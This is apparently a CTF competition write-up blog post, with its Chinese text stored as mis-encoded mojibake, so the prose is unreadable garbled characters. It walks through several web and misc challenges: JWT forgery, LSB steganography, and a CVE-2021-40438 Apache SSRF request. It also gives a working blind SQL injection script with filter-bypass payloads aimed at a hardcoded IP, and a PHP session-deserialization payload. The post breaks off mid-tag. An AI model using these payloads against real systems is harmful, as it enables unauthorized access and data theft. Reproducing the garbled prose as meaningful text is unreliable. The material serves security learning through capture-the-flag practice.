        <content type="html"><![CDATA[<h2 id="webè››è››â€¦å˜¿å˜¿â™¥æˆ‘çš„è››è››"><a href="#webè››è››â€¦å˜¿å˜¿â™¥æˆ‘çš„è››è››" class="headerlink" title="webè››è››â€¦å˜¿å˜¿â™¥æˆ‘çš„è››è››"></a>webè››è››â€¦å˜¿å˜¿â™¥æˆ‘çš„è››è››</h2><p>æœ¬é¢˜è¿›å…¥é¢˜ç›®åï¼Œæ ¹æ®é¢˜ç›®åˆ°è¾¾ç¬¬100å…³ï¼Œå¯¹æç¤ºè¿›è¡ŒæŠ“åŒ…ï¼Œåœ¨å›å¤ä¸­å¾—åˆ°flag</p><h2 id="webTetris-plus"><a href="#webTetris-plus" class="headerlink" title="webTetris plus"></a>webTetris plus</h2><p>æœ¬é¢˜æ‰“å¼€é¡µé¢ï¼Œæ˜¯ä¸ªæ¸¸æˆï¼Œå¯ä»¥F12ï¼Œä¹‹åæœç´¢alert<br><img src="https://img-blog.csdnimg.cn/1619019c2f56423c8da4ccae96940cc8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨check.jsä¸­çš„alertä¸‹é¢æœ‰jsfuckåŠ å¯†<br>åœ¨æ§åˆ¶å°ä¸Šè§£å¯†å¾—åˆ°flag</p><h2 id="webeasy-auth"><a href="#webeasy-auth" class="headerlink" title="webeasy_auth"></a>webeasy_auth</h2><p>æ ‡é¢˜authæç¤ºæ˜¯é‰´æƒæ–¹é¢çš„é—®é¢˜ï¼Œæè¿°ä¸­çš„â€œæ²¡æœ‰è°ƒè¯•å®Œâ€è¯´æ˜å­˜åœ¨å¼±å¯†ç ä¹‹ç±»çš„é—®é—®é¢˜ã€‚é—®é¢˜å‡ºåœ¨å‰ååç«¯äº¤äº’çš„tokenä¸­<br>é¦–å…ˆæ­£å¸¸æ³¨å†Œå¹¶ç™»å½•è‡ªå·±çš„è´¦å·ï¼Œè·å¾—è‡ªå·±çš„token<br><img src="https://img-blog.csdnimg.cn/0fbc2d34a505494eb3801db04b9686f9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å‰å¾€jwtè§£æå·¥å…·è¿›è¡Œè§£æï¼Œï¼Œå¯¹takenè¿›è¡Œjwtè§£å¯†<br><img src="https://img-blog.csdnimg.cn/f5f5b153050543639143c42b7c54f407.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¹‹åå°†idå’Œtokenè¿›è¡Œä¿®æ”¹ï¼Œæ”¹ä¸º1å’Œadmin<br><img src="https://img-blog.csdnimg.cn/7d02c9a493cf4acf8cd2af66923a7ae4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ”¾å…¥æœ¬åœ°å­˜å‚¨ç©ºé—´ï¼Œä¿®æ”¹ååˆ·æ–°å¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/5e33cf3d0f1943c0aa9632ee167c4de3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="miscå¥½åº·çš„æµé‡"><a href="#miscå¥½åº·çš„æµé‡" class="headerlink" title="miscå¥½åº·çš„æµé‡"></a>miscå¥½åº·çš„æµé‡</h2><p>é™„ä»¶ä¸ºwiresharkæµé‡æ–‡ä»¶<br>å¤§æ¦‚èƒ½çœ‹å‡ºæµé‡å†…å®¹ä¸ºä¸€å°é‚®ä»¶<br>ä½¿ç”¨wiresharkçš„ å¯¼å‡ºSMBå¯¹è±¡ å³å¯å¯¼å‡ºé‚®ä»¶å†…å®¹<br>PSï¼šéƒ¨åˆ†wiresharkå› ä¸ºç‰ˆæœ¬é—®é¢˜æ— æ³•è¯†åˆ« ä½¿ç”¨è¿½è¸ªtcpæµ ç„¶åbase64è§£ç  è·å¾—é‚®ä»¶å†…å®¹<br>ç»“åˆé‚®ä»¶ä¸­çš„LSBå†…å®¹<br>åˆ¤æ–­æ˜¯LSBéšå†™<br>æ‰«æå¾—åˆ°å‰åŠæ®µflag<br><img src="https://img-blog.csdnimg.cn/6cb68965309f4155be7d4e2ff768c4e3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¾—ååŠæ®µ<br><img src="https://img-blog.csdnimg.cn/3818672e03194c17a9f7dcda31c2df0f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="webpack-engine"><a href="#webpack-engine" class="headerlink" title="webpack-engine"></a>webpack-engine</h2><p>çœ‹æºç <br><img src="https://img-blog.csdnimg.cn/8f3aea5f37794c06a1bf19699556d41e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="web-Apache"><a href="#web-Apache" class="headerlink" title="web Apache!"></a>web Apache!</h2><p>æ‰“å¼€é¢˜ç›®çœ‹æºç å‘ç°é™„ä»¶<br>åœ¨Default.confå‘ç°flagè·¯å¾„<br><img src="https://img-blog.csdnimg.cn/5f26a67b06754c38ae817ebed19c5591.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœ¬é¢˜è€ƒæŸ¥CVE-2021-40438 Apache mod_proxy SSRF æ¼æ´<br>çœ‹è¯¦ç»†èµ„æ–™<br><a href="https://www.anquanke.com/post/id/263175#h2-0">CVE-2021-40438 Apache mod_proxy SSRF æ¼æ´åˆ†æ</a><br><a href="https://firzen.de/building-a-poc-for-cve-2021-40438">ä¸º CVE-2021-40438 æ„å»º POC</a><br><a href="https://www.anquanke.com/post/id/257657">Apache httpd Server CVE-2021-40438 æ¼æ´åˆ†æ</a><br><a href="https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html">Apache mod_proxy SSRFï¼ˆCVE-2021-40438ï¼‰çš„ä¸€ç‚¹åˆ†æå’Œå»¶ä¼¸</a><br>ä»è€Œå¾—åˆ°è·¯å¾„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /proxy?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http:<span class="comment">//127.0.0.1:60010/flag HTTP/1.1</span></span><br></pre></td></tr></table></figure><p>ï¼ˆç”±äºæˆ‘å†™çš„æ˜¯éƒ½æœåŠ¡å™¨ä¼¼ä¹å…³é—­äº†ï¼Œå› æ­¤æ²¡æœ‰å¾—åˆ°flagï¼‰</p><h2 id="web-Pokemon"><a href="#web-Pokemon" class="headerlink" title="web Pokemon"></a>web Pokemon</h2><p>æœ¬é¢˜è€ƒæŸ¥sqlæ³¨å…¥ä¸­çš„äºŒåˆ†æ³•ç›²æ³¨<br>è¿‡æ»¤=ç”¨likeç»•è¿‡<br><a href="https://blog.csdn.net/weixin_39557087/article/details/113441010">mysql æ³¨é‡Š ç»•è¿‡_SQLæ³¨å…¥ç»•è¿‡æ–¹æ³•</a><br>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://121.43.141.153:60056/error.php?code=&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (head &lt; tail):</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = &quot;if(ascii(substr(database(),%d,1))&gt;%d,404,403)&quot; % (i , mid)</span></span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((selselectect/*/**/*/flag/*/**/*/frfromom/*/**/*/fllllllllaaaaaag),%d,1))&gt;%d,404,403)&quot;</span> % (i, mid)</span><br><span class="line">        <span class="comment">#payload = &quot;if(ascii(substr((selselectect/*/**/*/group_concat(column_name)frfromom(infoorrmation_schema.columns)whwhereere(table_name/*/**/*/like/*/**/*/&#x27;fllllllllaaaaaag&#x27;)),%d,1))&gt;%d,404,403)&quot; % (i, mid)</span></span><br><span class="line"></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="comment">#r.encoding = &quot;utf-8&quot;</span></span><br><span class="line">        <span class="comment"># print(url+payload)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;404&quot;</span> in r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    last = result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web-ä¸€æœ¬å•è¯ä¹¦"><a href="#web-ä¸€æœ¬å•è¯ä¹¦" class="headerlink" title="web ä¸€æœ¬å•è¯ä¹¦"></a>web ä¸€æœ¬å•è¯ä¹¦</h2><blockquote><p>substr(string,start,length)     substr() å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚<br>strstr() å‡½æ•°æœç´¢å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€æ¬¡å‡ºç°ã€‚<br>strpos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚</p></blockquote><p>çœ‹æºç ï¼Œå‘ç°<a href="http://www.zipå¾—å‹ç¼©åŒ…/">www.zipå¾—å‹ç¼©åŒ…</a><br>ä¸‹è½½å¾—æºç <br>åœ¨save.phpä¸­å‘ç°å¯ä»¥æ“ä½œsessionæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/5337af59de4a4effb4cd0550b4e71c58.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨get.phpä¸­å‘ç°å¯ä»¥è¿›è¡Œååºåˆ—åŒ–<br><img src="https://img-blog.csdnimg.cn/fa09811a461d4b5f87eaf187fe213aa0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç”±äºæ•°æ®å¤„ç†æ—¶ä¸ºjson_decodeæ‰€ä»¥é”®å€¼å¯¹çš„é”®å¯æ§ï¼Œæ³¨å…¥sessionæ–‡ä»¶ï¼Œååºåˆ—åŒ–è¯»å–æ–‡ä»¶<br>paylaod</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;y0ng|O:4:\&quot;Evil\&quot;:2:&#123;s:4:\&quot;file\&quot;;s:5:\&quot;/flag\&quot;;s:4:\&quot;flag\&quot;;N;&#125;&quot;</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web-SecurityCenter"><a href="#web-SecurityCenter" class="headerlink" title="web SecurityCenter"></a>web SecurityCenter</h2><p>çœ‹æºç ï¼Œå‘ç°<br><img 